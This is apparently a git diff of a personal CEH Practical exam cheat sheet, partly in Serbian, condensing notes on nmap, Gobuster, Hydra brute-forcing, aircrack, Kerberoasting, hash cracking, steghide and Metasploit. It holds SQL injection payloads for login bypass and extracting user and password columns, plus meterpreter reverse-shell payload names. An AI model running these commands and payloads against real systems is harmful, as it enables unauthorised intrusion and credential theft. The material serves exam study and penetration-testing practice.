@@ -21,140 +21,85 @@ echo -e "username=Admin\npassword=Pa$$w0rd" | sudo tee /etc/smb-credentials >/de
 echo "//172.25.0.11/Users/Admin/Desktop/Share /home/attacker/Desktop/Share cifs credentials=/etc/smb-credentials,vers=3.0,uid=1000,gid=1000,iocharset=utf8,_netdev 0 0" | sudo tee -a /etc/fstab  && sudo mount -a && systemctl daemon-reload
 
 ________________________________________________________________
-//NMAP
+# 🛠 CEH Practical Cheat Sheet
 
-nmap -p- -A -O -sC -sV --script vuln --reason --traceroute -T4 10.10.1.0/24 -oN full_scan.txt
-
-nmap -p 137,389,445 --script smb-os-discovery,ldap-rootdse,nbstat 192.168.0.0/24
-
+# 🔍 NMAP
 nmap -sS -sV -p- <IP> -oN results.txt
+nmap -p- -A -O -sC -sV --script vuln -T4 <IP>
+nmap -p 137,389,445 --script smb-os-discovery,ldap-rootdse,nbstat <IP>
 
-docker run -d -p 9392:9392 --name openvas immauss/openvas
-
-
-//DNS
-
-dnsrecon -d site.com -a
-
-
-//HYDRA
-
-hydra -l /putanja-do-username-a -P /putanja-do-sifri ftp://<ip-adresa>
-
-
-
-//KERBEROS ROASTING sa impacket-om
-
-python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
-
-john --wordlist=/home/attacker/rockyou.txt hashes.txt
-
-//Analiza fajlova
-
-file <path do fajla> // cesto ce lagati za ekstenziju
-
-virustotal.com -> dobar za analizu .exe fajlova 
-
-https://github.com/horsicq/DIE-engine/releases/download/3.10/die_3.10_Parrot_5.3_amd64.deb DIE
-
-//STEG
-
-steghide extract -sf stealth.jpeg -p sifra@123
-
-//VULN Scan
-OpenVas ali i OWASP Zap radi posao sasvim ok
-
-//Aircrack
-1. aircrack-ng capture.pcap
-2. aircrack-ng -w rockyou.txt capture.pcap
-
-## 🌐 Gobuster – Kada i kako koristiti
-
-### 📌 Kada koristiti
-Koristi Gobuster kada vidiš:
-- "Find hidden directory"
-- "Find admin panel"
-- "Locate sensitive file"
-- "Enumerate web server"
-- "Find API endpoint"
-
-👉 znači: treba da pronađeš skrivene putanje ili fajlove na web serveru
-
----
-
-### 🧠 Šta radi
-Gobuster brute-force-uje:
-- direktorijume (`/admin`, `/backup`)
-- fajlove (`.php`, `.txt`, `.sql`)
-
----
-
-### 🔧 Osnovne komande
-
-#### 1. Basic scan
+# 🌐 GOBUSTER
 gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
-
-
-#### 2. Sa ekstenzijama (najbitnije)
 gobuster dir -u http://target -w common.txt -x php,txt,html
-
-#### 3. Backup / sensitive fajlovi
 gobuster dir -u http://target -w common.txt -x zip,sql,txt
 
-# Crypto 
+# 🔐 HYDRA
+hydra -l admin -P rockyou.txt ssh://<IP>
+hydra -l admin -P rockyou.txt ftp://<IP>
 
-| Input Pattern / Primer            | Tip (Šta je)        | Kako prepoznati                         | Alat za rešavanje            | Komanda / Akcija                          |
-|----------------------------------|---------------------|------------------------------------------|------------------------------|-------------------------------------------|
-| YWRtaW46cGFzc3dvcmQ=              | Base64              | Završava se sa =                         | CyberChef                    | From Base64                               |
-| 68 65 6c 6c 6f                   | Hex                 | Hex vrednosti (0-9, a-f)                 | CyberChef                    | From Hex                                  |
-| %68%65%6C%6C%6F                  | URL Encoding        | %xx format                               | CyberChef                    | URL Decode                                |
-| khoor                            | Caesar cipher       | Ima smisla posle pomeranja               | CyberChef                    | ROT / Caesar                              |
-| uryyb                            | ROT13               | često “random readable”                  | CyberChef                    | ROT13                                     |
-| 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 hash            | 32 hex karaktera                         | John the Ripper              | john --wordlist=rockyou.txt hash.txt       |
-| da39a3ee5e6b4b0d3255bfef95601890afd80709 | SHA1 hash | 40 hex karaktera                         | John / Hashcat               | john --format=raw-sha1 hash.txt           |
-| $2y$10$eImiTXuWVxfM37uY4JANjQ==   | bcrypt              | Počinje sa $2y$ ili $2a$                 | Hashcat                      | hashcat -m 3200 hash.txt rockyou.txt      |
-| U2FsdGVkX1+...                   | OpenSSL enc         | Počinje sa U2FsdGVkX1                    | CyberChef                    | OpenSSL Decrypt                           |
-| Random string + key              | XOR                 | Nečitljivo, ali ima pattern             | CyberChef                    | XOR Brute Force                           |
-| 0x48656c6c6f                     | Hex (0x)            | Počinje sa 0x                            | CyberChef                    | From Hex                                  |
-| admin:password                  | Credentials (plain) | Već čitljivo                             | N/A                          | Nema potrebe za decode                    |
+# 📡 AIRCRACK
+aircrack-ng capture.pcap
+aircrack-ng -w rockyou.txt capture.pcap
 
+# 🔎 DNS
+dnsrecon -d site.com -a
 
-# SQL Injection
+# 🧬 CRYPTO
+Base64 (=) → CyberChef
+32 hex → MD5 → John
+40 hex → SHA1 → John
+%xx → URL → CyberChef
+Hex → CyberChef
 
-## ✔ Test ranjivosti (error-based)
-'
-"
+# 💉 SQL INJECTION
+' 
+" 
 `
-
-## ✔ Basic zaobilaženje (login / autentifikacija)
 ' OR 1=1 --
-' OR '1'='1 --
 admin' --
-' OR ''='
-
-## ✔ Boolean test (tačno / netačno)
 ' AND 1=1 --
 ' AND 1=2 --
-' AND 'a'='a
-' AND 'a'='b
-
-## ✔ UNION test (izvlačenje podataka)
-' UNION SELECT null, null --
-' UNION SELECT database(), user() --
-' UNION SELECT user, password FROM users --
-
-## ✔ Otkrivanje broja kolona
+' UNION SELECT null,null --
+' UNION SELECT database(),user() --
+' UNION SELECT user,password FROM users --
 ' ORDER BY 1 --
 ' ORDER BY 2 --
-' ORDER BY 3 --
-
-## ✔ Blind SQL Injection (bez direktnog outputa)
 ' AND LENGTH(database())=4 --
 ' AND SUBSTRING(database(),1,1)='d' --
-' AND ASCII(SUBSTRING(database(),1,1))>100 --
 
-## ✔ Indikatori ranjivosti
-- prikazana SQL greška  
-- uspešno zaobilaženje logina  
-- vraćeno više rezultata nego očekivano  
-- razlika između TRUE / FALSE upita  
+# 🦠 MALWARE (PE)
+strings sample.exe
+strings sample.exe | grep http
+md5sum sample.exe
+
+# 💣 METASPLOIT
+msfconsole
+search smb
+use exploit/...
+show payloads
+set RHOSTS <IP>
+set LHOST <IP>
+run
+
+linux/x86/meterpreter/reverse_tcp
+windows/meterpreter/reverse_tcp
+generic/shell_reverse_tcp
+
+# 📂 FILE
+file sample
+strings sample
+
+# 🧪 STEGO
+steghide extract -sf file.jpg -p password
+
+# 🔍 SEARCHSPLOIT
+searchsploit apache
+
+# 🎯 LOGIKA
+web → gobuster
+login → hydra / sqli
+hash → john
+exploit → metasploit
+file → strings
+wifi → aircrack
+
